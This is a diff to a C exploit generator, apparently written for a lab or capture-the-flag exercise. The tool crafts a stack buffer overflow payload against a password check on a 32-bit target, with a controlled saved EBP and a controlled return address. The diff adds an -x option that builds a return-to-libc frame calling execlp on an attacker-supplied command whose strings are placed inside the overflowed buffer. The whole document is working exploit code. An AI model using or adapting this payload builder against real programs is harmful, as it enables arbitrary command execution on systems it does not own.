@@ -73,9 +73,10 @@ static inline int parse_hex32(uint32_t *result, const char *arg) {
 int main(int argc, char **argv) {
 	int do_ebp = 0;
 	int do_exit = -1;
+	int do_exec = 0;
 	int correct_password = 0;
 	uint32_t ebp = 0;
-	for(int opt; (opt = getopt(argc, argv, "b:e::v")) != -1;) {
+	for(int opt; (opt = getopt(argc, argv, "b:e::vx")) != -1;) {
 		switch(opt) {
 		case 'b':
 			if(parse_hex32(&ebp, optarg) < 0) {
@@ -99,6 +100,9 @@ int main(int argc, char **argv) {
 		case 'v':
 			correct_password = 1;
 			break;
+		case 'x':
+			do_exec = 1;
+			break;
 		default:
 			goto usage;
 		}
@@ -113,19 +117,34 @@ int main(int argc, char **argv) {
 		fprintf(stderr, "cannot parse %s: %s\n", argv[optind], strerror(errno));
 	usage:
 		fprintf(stderr, "Usage: %s [-b EBP] [-e[EXIT_CODE]] [-v] HEX_ADDRESS\n", argv[0]);
+		fprintf(stderr, "       %s [-b EBP] -x [-v] HEX_ADDRESS COMMAND...\n", argv[0]);
 		return 2;
 	}
 	++optind;
 
 	size_t extra_size = 0;
-	if(optind + 1 < argc) {
-		fprintf(stderr, "unexpected argument: %s\n", argv[optind + 1]);
-		goto usage;
-	}
+	if(do_exec) {
+		if(optind >= argc) {
+			fprintf(stderr, "missing argument: COMMAND\n");
+			goto usage;
+		}
+		// execlp's path arguument, terminating NULL, and return address
+		extra_size = 3 * sizeof(uint32_t);
+		// size of argv
+		for(size_t i = optind; i < (size_t)argc; ++i) {
+			extra_size += sizeof(uint32_t);
+			extra_size += strlen(argv[i]) + 1;
+		}
+	} else {
+		if(optind + 1 < argc) {
+			fprintf(stderr, "unexpected argument: %s\n", argv[optind + 1]);
+			goto usage;
+		}
 
-	if(do_exit >= 0) {
-		// exit's argument and return address
-		extra_size = 2 * sizeof(uint32_t);
+		if(do_exit >= 0) {
+			// exit's argument and return address
+			extra_size = 2 * sizeof(uint32_t);
+		}
 	}
 
 	// create buffer including return address
@@ -169,6 +188,32 @@ int main(int argc, char **argv) {
 		*stack++ = htole32(do_exit);
 
 		assert((char *)stack == buf + size + extra_size);
+	} else if(do_exec) {
+		uint32_t *argp = (uint32_t *)(buf + size);
+		char *const command = (char *)argp + sizeof(uint32_t) * (argc - optind + 3);
+		char *p = command;
+		// return address
+		*argp++ = htole32(-1);
+		// command
+		assert((char *)argp < command);
+		*argp++ = htole32(ADDR_PASSWORD + (p - buf));
+		// argv
+		for(size_t i = optind; i < (size_t)argc; ++i) {
+			assert((char *)argp < command);
+			*argp++ = htole32(ADDR_PASSWORD + (p - buf));
+
+			assert(p < buf + size + extra_size);
+			p = stpncpy(p, argv[i], buf + size + extra_size - p);
+
+			assert(p < buf + size + extra_size);
+			++p;
+		}
+		// terminating NULL
+		assert((char *)argp < command);
+		*argp++ = htole32(0);
+
+		assert((char *)argp == command);
+		assert(p == buf + size + extra_size);
 	}
 
 	for(char *c = buf; c < buf + size + extra_size; ++c) {
